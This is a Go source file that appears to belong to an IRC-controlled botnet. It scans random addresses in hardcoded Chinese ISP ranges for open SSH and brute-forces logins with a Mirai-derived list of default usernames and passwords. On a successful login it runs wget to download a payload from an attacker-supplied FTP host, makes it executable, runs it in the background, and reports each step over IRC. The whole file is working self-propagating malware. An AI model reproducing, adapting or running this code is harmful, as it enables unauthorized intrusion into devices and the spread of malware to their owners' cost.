package pkg

import (
	"bytes"
	"fmt"
	"math/rand"
	"net"
	"time"

	"golang.org/x/crypto/ssh"
)

var Scan_Switch bool

const (
	//CHINANET Hubei province network.
	chpn1 = "116.211" //116.211.255.255
	chpn2 = "119."    //119.96.0.0 - 119.97.255.255
	chpn3 = "119.102" //119.102.255.255
	chpn4 = "58.49"   //58.49.255.255
	chpn5 = "58.53"   //58.53.255.255
	chpn6 = "221."    //221.234.0.0 - 221.235.255.255

	//CHINANET Guangdong province network.
	cgpn1 = "14.116" //14.116.255.255
	cgpn2 = "14.118" //14.118.255.255
	cgpn3 = "14.127" //14.127.255.255
	cgpn4 = "14.29"  //14.29.255.255
	cgpn5 = "121.14" //121.14.255.255

	//CHINANET Jiangsu province network.
	cjpn1 = "49.70"   //49.70.255.255
	cjpn2 = "114.230" //114.230.255.255
	cjpn3 = "114.239" //114.239.255.255
	cjpn4 = "117.93"  //117.93.255.255
	cjpn5 = "121.131" //121.131.255.255

	//CHINANET shandong province network.
	cspn1 = "140." //140.246.0.0 - 182.250.255.255
	cspn2 = "182." //182.42.0.0 - 182.43.255.255

	//China TieTong Telecommunications Corporation.
	cttc1 = "36.212"  //36.212.255.255
	cttc2 = "36."     //36.208.0.0 - 36.209.255.255
	cttc3 = "110."    //110.218.0.0 - 110.219.255.255
	cttc4 = "110.101" //110.101.255.255
	cttc5 = "110.105" //110.105.255.255
	cttc6 = "122.88"  //122.88.255.255
	cttc7 = "122."    //122.94.0.0 - 122.95.255.255
)

func genRange(max, min int) string {
	rand.Seed(time.Now().UnixNano())
	return fmt.Sprint(rand.Intn(max+1-min) + min)
}

func manageRange(mainRange, setRange string) string {
	var ipGen []string
	ipGen = append(ipGen, mainRange)
	ipGen = append(ipGen, setRange, ".")

	for i := 0; i < 2; i++ {
		ipGen = append(ipGen, genRange(255, 0), ".")
	}

	ipGen[len(ipGen)-1] = ""
	ipGen = append(ipGen, ":22")
	return ipGen[0] + ipGen[1] + ipGen[2] + ipGen[3] +
		ipGen[4] + ipGen[5] + ipGen[6] + ipGen[7]
}

func nextIP(ipRange string) string {
	switch ipRange {
	case chpn2:
		return manageRange(ipRange, genRange(97, 96))
	case chpn6:
		return manageRange(ipRange, genRange(235, 234))
	case cttc2:
		return manageRange(ipRange, genRange(209, 208))
	case cttc3:
		return manageRange(ipRange, genRange(219, 218))
	case cttc7:
		return manageRange(ipRange, genRange(95, 94))
	case cspn1:
		return manageRange(ipRange, genRange(250, 246))
	case cspn2:
		return manageRange(ipRange, genRange(43, 42))
	default:
		return manageRange(ipRange, "")
	}
}

func checkPort(_ipRange string) string {
	ptrIP := &_ipRange
	conn, err := net.DialTimeout("tcp", *ptrIP, 1*time.Second)
	if err != nil {
		return ""
	}
	conn.Close()
	return *ptrIP
}

func ssh_config(ssh_name, ssh_pass string) *ssh.ClientConfig {
	config := &ssh.ClientConfig{
		User: ssh_name,
		Auth: []ssh.AuthMethod{
			ssh.Password(ssh_pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	return config
}

func ssh_session(ssh_session *ssh.Client, command string) {
	session, _ := ssh_session.NewSession()
	var set_session bytes.Buffer
	session.Stdout = &set_session
	session.Run(command)
	session.Close()
}

func (irc *IRC) SSH_Conn(set_FTP, set_payload string) {
	netList := []string{
		chpn1, chpn2, chpn3, chpn4, chpn5, chpn6,
		cgpn1, cgpn2, cgpn3, cgpn4, cgpn5,
		cjpn1, cjpn2, cjpn3, cjpn4, cjpn5,
		cttc1, cttc2, cttc3, cttc4, cttc5, cttc6, cttc7,
		cspn1, cspn2,
	}

	/*
		Thank mirai for these usernames and passwords list. (You are my inspirelation.)
		Add more usernames and passwords in to The slice name "userList" and "passList".
	*/
	userList := []string{
		"admin", "root", "user", "guest", "support", "login",
	}

	passList := []string{
		"", "admin", "root", "user", "guest", "support", "login", "password",
		"default", "1234", "12345", "123456", "12345678", "123456789", "1234567890", "pass",
		"54321", "123123", "888888", "666666", "00000000", "1111", "111111", "1111111",
		"ikwb", "system", "juantech", "realtek", "smcadmin", "hi3518", "admin1234", "jvbzd",
		"klv123", "klv1234", "xc3511", "vizxv", "xmhdipc", "Zte521", "7ujMko0admin", "7ujMko0vizxv",
	}

	for {
		for net := range netList {
			target := nextIP(netList[net])
			ptrTarget := &target
			turnRange := checkPort(*ptrTarget)

			if turnRange == "" {
				checkPort(target)
			} else {
				irc.IRC_Report("Try to login to " + turnRange)
				var logCheck bool

				for user := range userList {
					for pass := range passList {
						_session, err := ssh.Dial("tcp", turnRange, ssh_config(userList[user], passList[pass]))
						if err == nil {
							irc.IRC_Report("Login success at " + turnRange)
							ssh_session(_session, "wget -O ."+set_payload+" "+set_FTP)
							irc.IRC_Report("WGET on " + turnRange)
							ssh_session(_session, "chmod +x ."+set_payload)
							go ssh_session(_session, "./."+set_payload+" &")
							logCheck = true
							break
						} else {
							irc.IRC_Report("Failed to login to " + turnRange + " > " +
								fmt.Sprintf("%v:%v", userList[user], passList[pass]))
						}
					}
					if logCheck || Scan_Switch {
						break
					}
				}
				continue
			}
		}
		if Scan_Switch {
			break
		}
	}
}
